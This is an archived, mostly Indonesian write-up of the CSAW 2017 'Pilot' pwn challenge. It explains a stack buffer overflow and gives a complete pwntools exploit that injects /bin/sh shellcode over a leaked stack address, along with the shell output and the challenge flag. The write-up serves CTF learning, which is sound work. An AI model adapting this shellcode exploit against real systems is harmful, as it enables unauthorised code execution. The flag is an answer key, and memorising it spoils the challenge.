# Pilot

**CTF:** CSAW 2017 Quals  
**Category:** pwn  
**Original writeup:** <https://bytetolong.wordpress.com/2017/09/18/csaw-ctf-2017-prelims-write-up/> — by **bytetolong.wordpress.com**. All credit goes to the original author; this is an archived copy.

---

Pwn (75) – Pilot

pilot Can I take your order? nc pwn.chal.csaw.io 8464

Diberikan sebuah binary 64 bit striped.

dev@Pwning: ~ /CTF/CSAW2017$ file pilot pilot: ELF 64-bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6ed26a43b94fd3ff1dd15964e4106df72c01dc6c, stripped

Apabila program dijalankan akan meminta command yang merupakan inputan pengguna.

dev@Pwning: ~ /CTF/CSAW2017$ ./pilot [ * ]Welcome DropShip Pilot... [ * ]I am your assitant A.I.... [ * ]I will be guiding you through the tutorial.... [ * ]As a first step, lets learn how to land at the designated location.... [ * ]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics... [ * ]Good Luck Pilot ! .... [ * ]Location:0x7fff7a453100 [ * ]Command:

Dimana setelah dilakukan debugging menggunakan GDB, program tersebut vulnerable terhadap Buffer Overflow terlihat pada fungsi read() membaca 0x40 ( 64) bytes inputan pengguna yang seperti nya melebihi buffer size variable penampung yang terletak di rbp-0x20.

0x0000000000400acf : lea rax, [ rbp - 0x20 ] 0x0000000000400ad3 : mov edx, 0x40 0x0000000000400ad8 : mov rsi,rax 0x0000000000400adb : mov edi, 0x0 0x0000000000400ae0 : call 0x400820 < read@plt >

Didapatkan Location merupakan alamat stack dimana inputan penggunana akan disimpan dan dibutuhkan 40 bytes untuk meng overwrite register RIP.

gdb - peda$ x / s 0x7fffffffe210 0x7fffffffe210 : ' A ' < repeats 40 times >

Berikut exploit code yang digunakan

from pwn import * # r = process("./true") r = remote ( " pwn.chal.csaw.io " , 8464 ) r.recvuntil ( " Location: " ) shellcode = " \x48 \x31 \xff \x48 \x31 \xf6 \x48 \x31 \xd2 \x48 \x31 \xc0 \x50 \x48 \xbb\x2f \x62 \x69 \x6e\x2f\x2f \x73 \x68 \x53 \x48 \x89 \xe7\xb0\x3b\x0f \x05 " payload = " \x90 " * ( 40 - len ( shellcode ) ) payload = shellcode + payload addr = int ( r.recv ( 14 ) , 16 ) addr = p64 ( addr ) payload_to_send = payload + addr log.info ( " Payload Length %d " % ( len ( payload_to_send ) ) ) r.sendlineafter ( " Command: " ,payload_to_send ) r.interactive ( )

Exploit code dijalankan.

dev@Pwning: ~ / CTF / CSAW2017$ python pwn_pilot.py [ + ] Opening connection to pwn.chal.csaw.io on port 8464 : Done [ * ] Payload Length 48 [ * ] Switching to interactive mode $ ls flag pilot $ cat flag flag { 1 nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys } [ * ] Got EOF while reading in interactive

Flag : flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}
